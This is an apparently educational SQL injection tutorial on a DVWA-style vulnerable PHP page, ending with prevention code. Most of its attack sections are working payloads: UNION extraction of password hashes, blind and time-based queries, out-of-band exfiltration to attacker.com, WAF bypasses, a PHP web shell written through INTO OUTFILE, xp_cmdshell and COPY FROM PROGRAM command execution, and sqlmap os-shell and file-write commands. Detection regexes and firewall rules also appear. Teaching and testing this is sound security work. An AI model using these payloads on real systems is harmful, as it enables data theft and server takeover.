# Manual SQL Injection Tutorial (Basic to Advanced)

This comprehensive tutorial provides a step-by-step walkthrough on how a vulnerable PHP web application can be exploited using **SQL Injection**. It covers the process from basic enumeration to advanced techniques, including prevention methods.

---

## üìå **Table of Contents**

1. [Introduction](#1-introduction)
2. [Vulnerable PHP Code](#2-vulnerable-php-code)
3. [Sample Database Schema & Data](#3-sample-database-schema--data)
4. [Tools Used](#4-tools-used)
5. [Basic SQL Injection Steps](#5-basic-sql-injection-steps)
   - [Step 1: Finding the Number of Columns](#step-1-finding-the-number-of-columns)
   - [Step 2: Finding Injectable Columns](#step-2-finding-injectable-columns)
   - [Step 3: Enumerating Tables](#step-3-enumerating-tables)
   - [Step 4: Enumerating Columns](#step-4-enumerating-columns)
   - [Step 5: Extracting Data](#step-5-extracting-data)
6. [Advanced SQL Injection Techniques](#6-advanced-sql-injection-techniques)
   - [Boolean-Based Blind SQL Injection](#boolean-based-blind-sql-injection)
   - [Time-Based Blind SQL Injection](#time-based-blind-sql-injection)
   - [Out-of-Band SQL Injection](#out-of-band-sql-injection)
   - [Error-Based SQL Injection](#error-based-sql-injection)
   - [UNION-Based Advanced Attacks](#union-based-advanced-attacks)
   - [Bypassing Web Application Firewalls](#bypassing-web-application-firewalls)
   - [Second-Order SQL Injection](#second-order-sql-injection)
   - [Database-Specific Advanced Techniques](#database-specific-advanced-techniques)
   - [Automated SQL Injection Tools](#automated-sql-injection-tools)
7. [Prevention Techniques](#7-prevention-techniques)
   - [Basic Prevention](#basic-prevention)
   - [Advanced Prevention Techniques](#advanced-prevention-techniques)
8. [References](#8-references)

---

## 1. Introduction

SQL Injection is one of the oldest and most critical vulnerabilities found in web applications. It occurs when user inputs are improperly sanitized before being used in database queries, allowing attackers to manipulate the query structure.

This tutorial will walk you through the exploitation process using a simple PHP script as an example. You'll learn how attackers enumerate the database structure and retrieve sensitive information.

---

## 2. Vulnerable PHP Code

Below is the vulnerable PHP script (`vulnerable.php`) where user input is directly inserted into the query without sanitization:

```php
<?php    
if(isset($_GET['Submit'])){
    
    // Retrieve user input
    $id = $_GET['id'];

    // Vulnerable query
    $getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
    $result = mysql_query($getid) or die('<pre>' . mysql_error() . '</pre>' );

    $num = mysql_numrows($result);

    $i = 0;

    while ($i < $num) {

        $first = mysql_result($result,$i,"first_name");
        $last = mysql_result($result,$i,"last_name");
        
        echo '<pre>';
        echo 'ID: ' . $id . '<br>First name: ' . $first . '<br>Surname: ' . $last;
        echo '</pre>';

        $i++;
    }
}
?>
```

### ‚ùå Vulnerability

* No input validation or escaping
* Raw user input inserted into SQL query
* Error output revealed to attacker

---

## 3. Sample Database Schema & Data

### Table: `users`

| user_id | first_name | last_name | user     | password                         | avatar      |
|---------|------------|-----------|----------|----------------------------------|-------------|
| 5       | Bob        | Smith     | bobsmith | 5f4dcc3b5aa765d61d8327deb882cf99 | avatar1.png |
| 6       | Alice      | Johnson   | alicej   | e99a18c428cb38d5f260853678922e03 | avatar2.png |

---

## 4. Tools Used

* Browser or HTTP client
* DVWA (Damn Vulnerable Web Application) setup or local vulnerable environment
* MySQL database backend
* No automated tools are required for manual SQL injection

---

## 5. Basic SQL Injection Steps

### Step 1: Finding the Number of Columns

**Purpose:** Find how many columns are in the SELECT statement.

**Injected URL:**
```
http://example.com/vulnerable.php?id=5' order by 2 --+&Submit=Submit
```

**How it works:**
* The `'` closes the original string.
* `order by 2` asks the database to sort by the second column.
* `--+` comments out the rest.

**Test further with:**
```
http://example.com/vulnerable.php?id=5' order by 3 --+&Submit=Submit
```

**Expected Output:**

| ID | First name | Surname |
|----|------------|---------|
| 5  | Bob        | Smith   |

If `ORDER BY 3` produces an error like "Unknown column", it confirms there are **2 columns**.

---

### Step 2: Finding Injectable Columns

**Purpose:** Identify which columns are displayed to the user.

**Injected URL:**
```
http://example.com/vulnerable.php?id=5' union select 1,2 --+&Submit=Submit
```

**How it works:**
* Combines the result of the original query with another query.
* The attacker uses dummy values `1,2` to see where they appear.

**Expected Output:**

| ID | First name | Surname |
|----|------------|---------|
| 5  | Bob        | Smith   |
| 5  | 1          | 2       |

**Conclusion:** Both columns are output and injectable.

---

### Step 3: Enumerating Tables

**Purpose:** List all tables in the current database.

**Injected URL:**
```
http://example.com/vulnerable.php?id=5' union select group_concat(table_name),2 from information_schema.tables where table_schema=database() --+&Submit=Submit
```

**How it works:**
* Accesses `information_schema.tables` to fetch table names.
* `database()` returns the current database name.

**Expected Output:**

| ID | First name      | Surname |
|----|-----------------|---------|
| 5  | Bob             | Smith   |
| 5  | guestbook,users | 2       |

---

### Step 4: Enumerating Columns in `users` Table

**Purpose:** Discover all columns in the `users` table.

**Injected URL:**
```
http://example.com/vulnerable.php?id=5' union select group_concat(column_name),2 from information_schema.columns where table_name='users' --+&Submit=Submit
```

**How it works:**
* Accesses `information_schema.columns` to retrieve column names.

**Expected Output:**

| ID | First name                                           | Surname |
|----|------------------------------------------------------|---------|
| 5  | Bob                                                  | Smith   |
| 5  | user_id,first_name,last_name,user,password,avatar | 2       |

---

### Step 5: Extracting All Data from `users` Table

**Purpose:** Retrieve actual user data including sensitive fields.

**Injected URL:**
```
http://example.com/vulnerable.php?id=5' union select group_concat(user_id,':',user,':',password),2 from users --+&Submit=Submit
```

**How it works:**
* Retrieves data from the `users` table.
* Uses `GROUP_CONCAT()` to merge multiple rows.

**Expected Output:**

| ID | First name                                                                               | Surname |
|----|------------------------------------------------------------------------------------------|---------|
| 5  | Bob                                                                                      | Smith   |
| 5  | 5:bobsmith:5f4dcc3b5aa765d61d8327deb882cf99,6:alicej:e99a18c428cb38d5f260853678922e03 | 2       |

---

## 6. Advanced SQL Injection Techniques

### Boolean-Based Blind SQL Injection

Used when the application doesn't return SQL errors or query results but behaves differently based on whether a query returns TRUE or FALSE.

```sql
' AND 1=1 -- 
' AND 1=2 -- 
' AND SUBSTRING((SELECT DATABASE()),1,1)='a' -- 
' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))=97 -- 
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND table_name='users')=1 -- 
' AND (SELECT ASCII(SUBSTRING((SELECT password FROM users WHERE user_id=1),1,1)) & 128) = 128 -- 
```

### Time-Based Blind SQL Injection

Used when there's no visible output difference but we can infer information based on response delays.

```sql
'; WAITFOR DELAY '00:00:05' -- 
' OR SLEEP(5) -- 
' AND IF(SUBSTRING((SELECT DATABASE()),1,1)='a', SLEEP(5), 0) -- 
' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- 
' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE user_id=1),1,1))=97, SLEEP(5), 0) -- 
'; IF (SELECT COUNT(*) FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')=1 WAITFOR DELAY '00:00:05' -- 
```

### Out-of-Band SQL Injection

Used when we can trigger DNS or HTTP requests to exfiltrate data.

```sql
' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE user_id=1),'.attacker.com\\file.txt'))) -- 
'; EXEC master..xp_dirtree '\\'+(SELECT password FROM users WHERE user_id=1)+'.attacker.com\share' -- 
' AND (SELECT EXTRACTVALUE(XMLTYPE('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE user_id=1)||'.attacker.com/"> %remote;]>'),'/l') FROM DUAL) IS NOT NULL -- 
```

### Error-Based SQL Injection

Exploiting database error messages to extract information.

```sql
' AND ExtractValue(1, CONCAT(0x7e, (SELECT @@version), 0x7e)) -- 
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users WHERE user_id=1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- 
' AND 1=CONVERT(int, (SELECT password FROM users WHERE user_id=1)) -- 
' AND CAST((SELECT password FROM users WHERE user_id=1) AS INTEGER) -- 
```

### UNION-Based Advanced Attacks

```sql
' UNION SELECT NULL,NULL,NULL -- 
' UNION ALL SELECT 1,2,3 -- 
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users -- 
' UNION SELECT NULL,SUBSTRING((SELECT password FROM users WHERE user_id=1),1,30),NULL -- 
```

### Bypassing Web Application Firewalls

```sql
' UnIoN SeLeCt 1,2,3 -- 
'UNION%09SELECT%0A1,2,3%0DFROM%0Dusers-- 
'/**/UNION/**/SELECT/**/1,2,3/**/FROM/**/users-- 
' UNION SELECT 1,2,3 FROM users WHERE username=CHAR(97,100,109,105,110) -- 
' UNION SELECT 1,CONCAT('us','er','na','me'),3 FROM users -- 
```

### Second-Order SQL Injection

Attacks where malicious input is stored and executed later.

```sql
admin' -- 
UPDATE users SET password='newpassword' WHERE username='admin' -- ' 
email = 'attacker@example.com', name = 'admin' -- '
```

### Database-Specific Advanced Techniques

**MySQL:**
```sql
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL -- 
' UNION SELECT '<?php system($_GET["cmd"]); ?>',NULL,NULL INTO OUTFILE '/var/www/html/shell.php' -- 
' UNION SELECT LOAD_FILE('\\\\attacker.com\\share\\'),NULL,NULL -- 
```

**MSSQL:**
```sql
'; EXEC xp_cmdshell 'whoami' -- 
'; EXEC xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Services\lanmanserver\parameters','nullsessionshares' -- 
'; SELECT * FROM OPENQUERY('LINKED_SERVER','SELECT @@version') -- 
```

**PostgreSQL:**
```sql
' UNION SELECT pg_read_file('/etc/passwd'),NULL,NULL -- 
' UNION SELECT pg_write_file('/tmp/test.txt','test content'),NULL,NULL -- 
'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec; -- 
```

**Oracle:**
```sql
' UNION SELECT utl_inaddr.get_host_name((SELECT password FROM users WHERE user_id=1)),NULL FROM DUAL -- 
' UNION SELECT NULL,(SELECT EXTRACTVALUE(XMLTYPE('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/"> %remote;]>'),'/l') FROM DUAL),NULL FROM DUAL -- 
```

### Automated SQL Injection Tools

**SQLmap Advanced Usage:**
```bash
# Basic detection
sqlmap -u "http://example.com/vulnerable.php?id=1"

# Boolean-based blind
sqlmap -u "http://example.com/vulnerable.php?id=1" --technique=B

# Time-based blind
sqlmap -u "http://example.com/vulnerable.php?id=1" --technique=T --time-sec=10

# Union-based
sqlmap -u "http://example.com/vulnerable.php?id=1" --technique=U

# Error-based
sqlmap -u "http://example.com/vulnerable.php?id=1" --technique=E

# OS shell
sqlmap -u "http://example.com/vulnerable.php?id=1" --os-shell

# File operations
sqlmap -u "http://example.com/vulnerable.php?id=1" --file-read="/etc/passwd"
sqlmap -u "http://example.com/vulnerable.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# WAF bypass
sqlmap -u "http://example.com/vulnerable.php?id=1" --tamper="space2comment,charencode"

# Advanced testing
sqlmap -u "http://example.com" --crawl=2 --batch
sqlmap -u "http://example.com/login.php" --data="username=admin&password=test"
sqlmap -u "http://example.com/vulnerable.php" --cookie="PHPSESSID=abc123; id=1"
sqlmap -u "http://example.com/vulnerable.php" --headers="X-Forwarded-For: 127.0.0.1"
sqlmap -u "http://example.com/vulnerable.php" --proxy="http://127.0.0.1:8080"
sqlmap -u "http://example.com/vulnerable.php?id=1*" --prefix="'" --suffix="--"
```

---

## 7. Prevention Techniques

### Basic Prevention

**Use Prepared Statements:**
```php
<?php
if(isset($_GET['Submit'])){
    $conn = new mysqli("localhost", "root", "password", "database");

    $id = $_GET['id'];
    $stmt = $conn->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
    $stmt->bind_param("i", $id);
    $stmt->execute();
    $result = $stmt->get_result();

    while ($row = $result->fetch_assoc()) {
        echo '<pre>';
        echo 'ID: ' . htmlspecialchars($id) . '<br>First name: ' . htmlspecialchars($row['first_name']) . '<br>Surname: ' . htmlspecialchars($row['last_name']);
        echo '</pre>';
    }
}
?>
```

### Advanced Prevention Techniques

**Parameterized Queries with ORM:**
```php
// Using PDO with prepared statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username AND password = :password");
$stmt->execute(['username' => $username, 'password' => $password]);
$user = $stmt->fetch();

// Using MySQLi with prepared statements
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();
$user = $result->fetch_assoc();
```

**Stored Procedures:**
```sql
CREATE PROCEDURE GetUserByCredentials
    @Username NVARCHAR(50),
    @Password NVARCHAR(50)
AS
BEGIN
    SELECT * FROM users WHERE username = @Username AND password = @Password
END
```

```php
// Calling stored procedure
$stmt = $pdo->prepare("CALL GetUserByCredentials(?, ?)");
$stmt->execute([$username, $password]);
$user = $stmt->fetch();
```

**Input Validation and Sanitization:**
```php
function isValidInput($input, $type = 'string') {
    switch ($type) {
        case 'integer':
            return filter_var($input, FILTER_VALIDATE_INT) !== false;
        case 'email':
            return filter_var($input, FILTER_VALIDATE_EMAIL) !== false;
        case 'string':
        default:
            return preg_match('/^[a-zA-Z0-9_\-@\. ]+$/', $input) === 1;
    }
}

function getUserId($id) {
    if (!isValidInput($id, 'integer')) {
        return false;
    }
    
    $stmt = $pdo->prepare("SELECT * FROM users WHERE user_id = ?");
    $stmt->execute([$id]);
    return $stmt->fetch();
}
```

**Least Privilege Principle:**
```sql
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_password';
GRANT SELECT, INSERT, UPDATE ON app_db.users TO 'app_user'@'localhost';
GRANT SELECT ON app_db.products TO 'app_user'@'localhost';
REVOKE DROP, CREATE, ALTER, GRANT OPTION FROM 'app_user'@'localhost';
```

**Web Application Firewall (WAF) Rules:**
```nginx
SecRule REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/* "\bunion\b.*\bselect\b" \
    "phase:2,deny,status:403,msg:'SQL Injection Attack'"

SecRule REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/* "\bsleep\b\(.*\)" \
    "phase:2,deny,status:403,msg:'SQL Injection Attack'"

SecRule REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/* "\bwaitfor\b.*\bdelay\b" \
    "phase:2,deny,status:403,msg:'SQL Injection Attack'"
```

**Regular Expression Filters:**
```php
function detectSqlInjection($input) {
    $patterns = [
        '/union.*select/i',
        '/insert.*into/i',
        '/update.*set/i',
        '/delete.*from/i',
        '/drop.*table/i',
        '/truncate.*table/i',
        '/exec\(|execute\(|sp_/i',
        '/sleep\(|waitfor|benchmark\(/i',
        '/--|#|\/\*.*\*\//',
        '/\b(and|or)\b.*[=<>].*[\(\)]/i',
        '/load_file|into.*outfile|into.*dumpfile/i',
        '/@@version|@@hostname|@@datadir/i'
    ];
    
    foreach ($patterns as $pattern) {
        if (preg_match($pattern, $input)) {
            return true;
        }
    }
    
    return false;
}
```

**Logging and Monitoring:**
```php
function logSecurityEvent($eventType, $details, $userId = null) {
    $logData = [
        'timestamp' => date('Y-m-d H:i:s'),
        'event_type' => $eventType,
        'user_id' => $userId,
        'ip_address' => $_SERVER['REMOTE_ADDR'],
        'user_agent' => $_SERVER['HTTP_USER_AGENT'],
        'request_uri' => $_SERVER['REQUEST_URI'],
        'details' => $details
    ];
    
    file_put_contents('/var/log/security.log', json_encode($logData) . PHP_EOL, FILE_APPEND);
}

$input = $_GET['id'];
if (detectSqlInjection($input)) {
    logSecurityEvent('SQL_INJECTION_ATTEMPT', 
        "Potential SQL injection detected in parameter: " . $input);
    http_response_code(403);
    exit('Invalid request');
}
```

---

## 8. References

* [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
* [MySQL Documentation: Information Schema](https://dev.mysql.com/doc/refman/8.0/en/information-schema.html)
* [Prepared Statements in PHP](https://www.php.net/manual/en/mysqli.quickstart.prepared-statements.php)

---

## ‚úÖ Final Notes

This tutorial demonstrates how a seemingly simple input field can be exploited if not properly validated. It also provides the foundation to understand more complex injection scenarios and highlights the importance of secure coding practices.

Feel free to fork, modify, and share this tutorial for educational and awareness purposes.

**Disclaimer:** This tutorial is for educational purposes only. Always ensure you have proper authorization before testing any system for vulnerabilities.